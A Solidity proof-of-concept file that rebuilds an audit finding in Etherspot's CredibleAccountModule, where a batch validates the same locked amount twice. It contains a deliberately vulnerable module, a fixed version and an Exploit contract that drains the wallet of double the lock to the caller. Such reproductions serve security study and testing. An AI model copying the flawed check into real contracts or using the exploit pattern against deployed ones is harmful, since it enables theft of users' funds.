// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Etherspot CredibleAccountModule — a batch consumes lockedAmount twice
    (Shieldify, C-01, July 2025).
    SYNTHETIC, cheatcode-free. One transaction, no warp.
    _validateTokenData adds claimedAmount whenever amount equals lockedAmount.
    A two-item batch of that amount passes twice. The wallet loses 2x the lock.
    The extra 1,000 goes to the session caller. isSessionClaimed is false
    because claimed is 2,000 and locked is 1,000, so claim pays 0.
    Control requires claimedAmount == 0, so the second item is rejected and
    the wallet loses the lock once. */

contract Token {
    string public constant name = "Session";
    string public constant symbol = "SES";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SmartWallet {
    function approveToken(Token token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

struct LockedToken {
    address token;
    uint256 lockedAmount;
    uint256 claimedAmount;
}

contract CredibleAccountModule {
    mapping(address => LockedToken[]) internal _locks;

    function enableSession(address sessionKey, address token, uint256 lockedAmount) external {
        _locks[sessionKey].push(LockedToken({token: token, lockedAmount: lockedAmount, claimedAmount: 0}));
    }

    function lockedAmountOf(address sessionKey) external view returns (uint256) {
        return _locks[sessionKey][0].lockedAmount;
    }

    function claimedAmountOf(address sessionKey) external view returns (uint256) {
        return _locks[sessionKey][0].claimedAmount;
    }

    function _walletTokenBalance(address wallet, address token) internal view returns (uint256) {
        return Token(token).balanceOf(wallet);
    }

    function _validateTokenData(address sessionKey, address wallet, uint256 amount, address token) internal returns (bool) {
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token) {
                if (_walletTokenBalance(wallet, token) >= amount && amount == tokens[i].lockedAmount) {
                    // FIX: also require tokens[i].claimedAmount == 0
                    // @> VULN: claimedAmount grows again with no check that this lock was already consumed
                    tokens[i].claimedAmount += amount;
                    return true;
                }
            }
        }
        return false;
    }

    function executeBatch(
        address sessionKey,
        address wallet,
        address token,
        address firstTo,
        address secondTo
    ) external returns (uint256 taken) {
        uint256 amount = _locks[sessionKey][0].lockedAmount;
        bool firstOk = _validateTokenData(sessionKey, wallet, amount, token);
        bool secondOk = _validateTokenData(sessionKey, wallet, amount, token);
        if (firstOk) {
            Token(token).transferFrom(wallet, firstTo, amount);
            taken += amount;
        }
        if (secondOk) {
            Token(token).transferFrom(wallet, secondTo, amount);
            taken += amount;
        }
    }

    function isSessionClaimed(address sessionKey) public view returns (bool) {
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].lockedAmount != tokens[i].claimedAmount) return false;
        }
        return true;
    }

    function claim(address sessionKey) external view returns (uint256 paid) {
        if (!isSessionClaimed(sessionKey)) return 0;
        return _locks[sessionKey][0].lockedAmount;
    }
}

contract CredibleAccountModuleFixed {
    mapping(address => LockedToken[]) internal _locks;

    function enableSession(address sessionKey, address token, uint256 lockedAmount) external {
        _locks[sessionKey].push(LockedToken({token: token, lockedAmount: lockedAmount, claimedAmount: 0}));
    }

    function claimedAmountOf(address sessionKey) external view returns (uint256) {
        return _locks[sessionKey][0].claimedAmount;
    }

    function _walletTokenBalance(address wallet, address token) internal view returns (uint256) {
        return Token(token).balanceOf(wallet);
    }

    function _validateTokenData(address sessionKey, address wallet, uint256 amount, address token) internal returns (bool) {
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token) {
                if (
                    _walletTokenBalance(wallet, token) >= amount && amount == tokens[i].lockedAmount
                        && tokens[i].claimedAmount == 0
                ) {
                    tokens[i].claimedAmount += amount;
                    return true;
                }
            }
        }
        return false;
    }

    function executeBatch(
        address sessionKey,
        address wallet,
        address token,
        address firstTo,
        address secondTo
    ) external returns (uint256 taken) {
        uint256 amount = _locks[sessionKey][0].lockedAmount;
        bool firstOk = _validateTokenData(sessionKey, wallet, amount, token);
        bool secondOk = _validateTokenData(sessionKey, wallet, amount, token);
        if (firstOk) {
            Token(token).transferFrom(wallet, firstTo, amount);
            taken += amount;
        }
        if (secondOk) {
            Token(token).transferFrom(wallet, secondTo, amount);
            taken += amount;
        }
    }

    function isSessionClaimed(address sessionKey) public view returns (bool) {
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].lockedAmount != tokens[i].claimedAmount) return false;
        }
        return true;
    }

    function claim(address sessionKey) external view returns (uint256 paid) {
        if (!isSessionClaimed(sessionKey)) return 0;
        return _locks[sessionKey][0].lockedAmount;
    }
}

contract Exploit {
    uint256 public constant LOCK = 1_000 ether;
    uint256 public constant EXTRA = 1_000 ether;
    address public constant INVOICE = address(0x2222222222222222222222222222222222222222);

    Token public token;
    CredibleAccountModule public module;
    SmartWallet public wallet;
    address public sessionKey;
    uint256 public claimed;
    uint256 public claimPaid;
    uint256 public extraTaken;
    bool public sessionSettled;

    constructor() {
        token = new Token();
        module = new CredibleAccountModule();
        wallet = new SmartWallet();
        sessionKey = address(this);
    }

    function run() external {
        token.mint(address(wallet), LOCK + EXTRA);
        wallet.approveToken(token, address(module));
        module.enableSession(sessionKey, address(token), LOCK);
        uint256 taken = module.executeBatch(sessionKey, address(wallet), address(token), INVOICE, msg.sender);
        claimed = module.claimedAmountOf(sessionKey);
        require(claimed == LOCK + EXTRA, "lock was counted twice");
        require(taken == LOCK + EXTRA, "batch moved both items");
        extraTaken = token.balanceOf(msg.sender);
        require(extraTaken == EXTRA, "extra tokens");
        require(token.balanceOf(INVOICE) == LOCK, "invoice got the one lock");
        require(token.balanceOf(address(wallet)) == 0, "wallet drained");
        sessionSettled = module.isSessionClaimed(sessionKey);
        require(!sessionSettled, "session still looks claimed");
        claimPaid = module.claim(sessionKey);
        require(claimPaid == 0, "claim pays 0");
    }
}
